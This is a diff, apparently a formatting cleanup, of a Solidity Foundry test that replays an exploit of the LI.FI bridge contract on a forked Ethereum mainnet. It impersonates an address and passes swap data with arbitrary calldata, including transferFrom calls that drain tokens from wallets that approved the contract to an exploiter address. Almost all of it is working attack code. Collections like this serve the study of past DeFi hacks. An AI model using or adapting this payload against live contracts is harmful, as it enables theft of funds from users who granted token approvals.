@@ -15,6 +15,7 @@ interface ILIFI {
         uint256 destinationChainId;
         uint256 amount;
     }
+
     struct SwapData {
         address callTo;
         address approveTo;
@@ -23,6 +24,7 @@ interface ILIFI {
         uint256 fromAmount;
         bytes callData;
     }
+
     struct CBridgeData {
         address receiver;
         address token;
@@ -31,22 +33,26 @@ interface ILIFI {
         uint64 nonce;
         uint32 maxSlippage;
     }
-    function swapAndStartBridgeTokensViaCBridge(LiFiData memory _liFiData,SwapData[] calldata _swapData,CBridgeData memory _cBridgeData) external payable;
+
+    function swapAndStartBridgeTokensViaCBridge(
+        LiFiData memory _liFiData,
+        SwapData[] calldata _swapData,
+        CBridgeData memory _cBridgeData
+    ) external payable;
 }
 
 contract ContractTest is DSTest {
-    address from = address(0x00c6f2bde06967e04caaf4bf4e43717c3342680d76);
-    address lifi = address(0x005a9fd7c39a6c488e715437d7b1f3c823d5596ed1);
-    address exploiter = address(0x00878099f08131a18fab6bb0b4cfc6b6dae54b177e);  
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D); 
-    
+    address from = address(0xC6f2bDE06967E04caAf4bF4E43717c3342680d76);
+    address lifi = address(0x5A9Fd7c39a6C488E715437D7b1f3C823d5596eD1);
+    address exploiter = address(0x878099F08131a18Fab6bB0b4Cfc6B6DAe54b177E);
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+
     function setUp() public {
-        cheats.createSelectFork("mainnet", 14420686);//fork mainnet at block 14420686
-        
+        cheats.createSelectFork("mainnet", 14_420_686); //fork mainnet at block 14420686
     }
 
     function testExploit() public {
-        cheats.startPrank(from); 
+        cheats.startPrank(from);
 
         // The Vulnerability
         // The hack took advantage of our pre-bridge swap feature. Our smart contract allows a caller to pass an array of multiple swaps using any address with arbitrary calldata.
@@ -59,15 +65,15 @@ contract ContractTest is DSTest {
             integrator: "li.finance",
             referrer: 0x0000000000000000000000000000000000000000,
             sendingAssetId: 0xdAC17F958D2ee523a2206206994597C13D831ec7,
-            receivingAssetId: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 
+            receivingAssetId: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
             receiver: 0x878099F08131a18Fab6bB0b4Cfc6B6DAe54b177E,
-            destinationChainId: 42161,
-            amount: 50000000
+            destinationChainId: 42_161,
+            amount: 50_000_000
         });
         ILIFI.SwapData[] memory _swapData = new ILIFI.SwapData[](38);
         _swapData[0] = ILIFI.SwapData({
             approveTo: 0xDef1C0ded9bec7F1a1670819833240f027b25EfF,
-            callData: hex"d9627aa400000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000002faf0800000000000000000000000000000000000000000000000000000000002625a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", 
+            callData: hex"d9627aa400000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000002faf0800000000000000000000000000000000000000000000000000000000002625a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
             // sellToUniswap(address[],uint256,uint256,bool)
             // {
             //     "tokens":[
@@ -79,24 +85,25 @@ contract ContractTest is DSTest {
             //     "isSushi":false
             // }
             callTo: 0xDef1C0ded9bec7F1a1670819833240f027b25EfF,
-            fromAmount: 50000000,
+            fromAmount: 50_000_000,
             receivingAssetId: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
             sendingAssetId: 0xdAC17F958D2ee523a2206206994597C13D831ec7 // fromAssetId
-            // if (!LibAsset.isNativeAsset(fromAssetId) && LibAsset.getOwnBalance(fromAssetId) < fromAmount) {
-            //     LibAsset.transferFromERC20(_swapData.sendingAssetId, msg.sender, address(this), fromAmount);
-            // }
-
-            // if (!LibAsset.isNativeAsset(fromAssetId)) {
-            //     LibAsset.approveERC20(IERC20(fromAssetId), _swapData.approveTo, fromAmount);
-            // }
-
-            // // solhint-disable-next-line avoid-low-level-calls
-            // (bool success, bytes memory res) = _swapData.callTo.call{ value: msg.value }(_swapData.callData);
+                // if (!LibAsset.isNativeAsset(fromAssetId) && LibAsset.getOwnBalance(fromAssetId) < fromAmount) {
+                //     LibAsset.transferFromERC20(_swapData.sendingAssetId, msg.sender, address(this), fromAmount);
+                // }
         });
+
+        // if (!LibAsset.isNativeAsset(fromAssetId)) {
+        //     LibAsset.approveERC20(IERC20(fromAssetId), _swapData.approveTo, fromAmount);
+        // }
+
+        // // solhint-disable-next-line avoid-low-level-calls
+        // (bool success, bytes memory res) = _swapData.callTo.call{ value: msg.value }(_swapData.callData);
+
         _swapData[1] = ILIFI.SwapData({
             approveTo: 0x0000000000000000000000000000000000000000,
             callData: hex"23b872dd000000000000000000000000445c21166a3cb20b14fa84cfc5d122f6bd3ffa17000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000a4a88a24badca2e52e", // transferFrom(address,address,uint256)
-            callTo: 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0, 
+            callTo: 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0,
             fromAmount: 0,
             receivingAssetId: 0x0000000000000000000000000000000000000000,
             sendingAssetId: 0x0000000000000000000000000000000000000000
@@ -391,14 +398,14 @@ contract ContractTest is DSTest {
         });
 
         ILIFI.CBridgeData memory _cBridgeData = ILIFI.CBridgeData({
-            amount:40000000,
-            dstChainId:42161,
-            maxSlippage:255921,
-            nonce:1647074829664,
+            amount: 40_000_000,
+            dstChainId: 42_161,
+            maxSlippage: 255_921,
+            nonce: 1_647_074_829_664,
             receiver: 0x878099F08131a18Fab6bB0b4Cfc6B6DAe54b177E,
             token: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
         });
-        
+
         ILIFI(lifi).swapAndStartBridgeTokensViaCBridge(_lifiData, _swapData, _cBridgeData);
     }
 }
